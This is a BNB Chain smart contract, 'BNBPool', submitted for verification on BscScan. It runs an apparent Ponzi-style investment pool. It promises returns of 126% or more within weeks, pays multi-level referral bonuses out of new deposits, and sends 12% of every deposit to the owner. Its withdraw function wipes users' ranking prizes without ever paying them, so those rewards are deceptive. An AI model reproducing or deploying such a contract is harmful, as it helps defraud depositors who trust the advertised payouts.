/**
 *Submitted for verification at BscScan.com on 2021-12-10
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;
struct Invest {
  uint8 Plans;
  uint256 amount;
  uint40 time;
}
struct Plans {
  uint8 life_days;
  uint256 percent;
}
struct Investor {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Invest[] invests;
  uint256[5] structure; 
}

contract BNBPool{
    using SafeMath for uint256;
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 constant public INVEST_MIN_AMOUNT = 50000000000000000;
	uint256 public timePointer;
	mapping (address => uint256) public prizes;
	uint256 constant public INVEST_MIN_FORREWARD = 3000000000000000000;
	uint256 public totalReinvest;
	uint256 public availableRewardedBonus;
    mapping(uint256 => mapping(address => uint256)) public investors;
	mapping(uint256 => address[8]) public investorsRank;
    uint256 public startUNIX;
	uint256[8] public rankPercent = [300,150,100,100,100,50,50,50];
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
     uint256 constant public INVESTOR_FEE = 15;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [70, 50, 30, 20, 10]; 
	uint256 constant public TIME_STEP = 1 days;
    mapping(uint8 => Plans) public Planss;
    mapping(address => Investor) public Investors;
	uint256 public bnbBucketinvestor; 
    uint256 public debts;
    mapping(uint256=>bool) public settleStatus;
    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewInvest(address indexed addr, uint256 amount, uint8 Plans);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
   modifier settleBonus(){
        settlePerformance();
        _;
    }
    constructor() {
        owner = msg.sender;

startUNIX=block.timestamp;
        uint256 PlansPercent = 126;
        for (uint8 PlansDuration = 7; PlansDuration <= 26; PlansDuration++) {
            Planss[PlansDuration] = Plans(PlansDuration, PlansPercent);
            PlansPercent+= 7;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            Investors[_addr].last_payout = uint40(block.timestamp);
            Investors[_addr].dividends += payout;
        }
    }
function duration() public view returns(uint256){
        return duration(startUNIX);
    }
    
    function duration(uint256 startTime) public view returns(uint256){
        if(block.timestamp<startTime){
            return 0;
        }else{
            return block.timestamp.sub(startTime).div(TIME_STEP);
        }
    }
     
    function _refPayout(address _addr, uint256 _amount) private {
        address up = Investors[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            Investors[up].match_bonus += bonus;
            Investors[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = Investors[up].upline;
        }
    }
	function settlePerformance() public {
        if(timePointer<duration()){
        	address[8] memory ranking = sortRanking(timePointer);
          	if(!settleStatus[timePointer]){
				uint256 bonus;
				uint256 refBonus;
				uint256 availableBalance = availableBalanceInvestor();
				for(uint8 i= 0;i<8;i++){
					if(ranking[i]!=address(0)){
						refBonus = availableBalance.mul(rankPercent[i]).div(1000);
						prizes[ranking[i]] = prizes[ranking[i]].add(refBonus);
						bonus = bonus.add(refBonus);
					}
				}
				debts= debts.add(bonus);
				settleStatus[timePointer] = true;
        	}
			timePointer = duration();
        }
    }
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(Investors[_addr].upline == address(0) && _addr != owner) {
            if(Investors[_upline].invests.length == 0) {
                _upline = owner;
            }

            Investors[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                Investors[_upline].structure[i]++;

                _upline = Investors[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function invest(uint8 _Plans, address _upline) external settleBonus payable {
        require(Planss[_Plans].life_days > 0, "Plans not found");
        require(msg.value >= 0.01 ether, "Minimum Invest amount is 0.01 BNB");

        Investor storage investor = Investors[msg.sender];

        require(investor.invests.length < 100, "Max 100 Invests per address");

        _setUpline(msg.sender, _upline, msg.value);

        investor.invests.push(Invest({
            Plans: _Plans,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        investor.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        uint256 investorfee = msg.value.mul(INVESTOR_FEE).div(PERCENT_DIVIDER);
		bnbBucketinvestor=bnbBucketinvestor.add(investorfee);
        		investors[duration()][msg.sender] = investors[duration()][msg.sender].add(msg.value); 
       
     	_updateInvestorRanking(msg.sender);
        payable(owner).transfer(msg.value * 12  / 100);
        
        emit NewInvest(msg.sender, msg.value, _Plans);
    }
    
    function withdraw() external {
        Investor storage investor = Investors[msg.sender];

        _payout(msg.sender);

        require(investor.dividends > 0 || investor.match_bonus > 0, "Zero amount");

        uint256 amount = investor.dividends + investor.match_bonus;

        investor.dividends = 0;
        investor.match_bonus = 0;
        investor.total_withdrawn += amount;
        withdrawn += amount;
if(prizes[msg.sender]>0){
			withdrawn=withdrawn.add(prizes[msg.sender]);
			prizes[msg.sender]=0;
		}

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Investor storage investor = Investors[_addr];

        for(uint256 i = 0; i < investor.invests.length; i++) {
            Invest storage dep = investor.invests[i];
            Plans storage plans = Planss[dep.Plans];

            uint40 time_end = dep.time + plans.life_days * 86400;
            uint40 from = investor.last_payout > dep.time ? investor.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * plans.percent / plans.life_days / 8640000;
            }
        }

        return value;
    }

function shootOut(address[8] memory rankingList,address userAddress) public view returns (uint256 sn,uint256 minPerformance){
        
        minPerformance = investors[duration()][rankingList[0]];
        for(uint8 i =0;i<8;i++){
            if(rankingList[i]==userAddress){
                return (8,0);
            }
            if(investors[duration()][rankingList[i]]<minPerformance){
                minPerformance =investors[duration()][rankingList[i]];
                sn = i;
            }
        }
        
        return (sn,minPerformance);
    }
    
    function _updateInvestorRanking(address userAddress) private {
        address[8] memory rankingList = investorsRank[duration()];
        (uint256 sn,uint256 minPerformance) = shootOut(rankingList,userAddress);
        if(sn!=8){
            if(minPerformance<investors[duration()][userAddress]){
                rankingList[sn] = userAddress;
            }
            investorsRank[duration()] = rankingList;
        }
    }
    
    function sortRanking(uint256 _duration) public view returns(address[8] memory ranking){
       
        ranking=investorsRank[_duration];
        address tmp;
        for(uint8 i = 1;i<8;i++){
            for(uint8 j = 0;j<8-i;j++){
                if(investors[_duration][ranking[j]]<investors[_duration][ranking[j+1]]){
                    tmp = ranking[j];
                    ranking[j] = ranking[j+1];
                    ranking[j+1] = tmp;
                }
            }
        }
        
        return ranking;
    }
    
	function userInvestorRanking(uint256 _duration) external view returns(address[8] memory addressList,uint256[8] memory performanceList,uint256[8] memory preEarn){
        
        addressList = sortRanking(_duration);
        uint256 credit = availableBalanceInvestor();
        for(uint8 i = 0;i<8;i++){
            preEarn[i] = credit.mul(rankPercent[i]).div(1000);
            performanceList[i] = investors[_duration][addressList[i]];
        }
        
    }
	
	function availableBalanceInvestor() public view returns(uint256){
        
        if(bnbBucketinvestor>debts){
            return bnbBucketinvestor.sub(debts);
        }
        else{
            return 0;
        }
        
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Investor storage investor = Investors[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = investor.structure[i];
        }

        return (
            payout + investor.dividends + investor.match_bonus,
            investor.total_invested,
            investor.total_withdrawn,
            investor.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }

}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}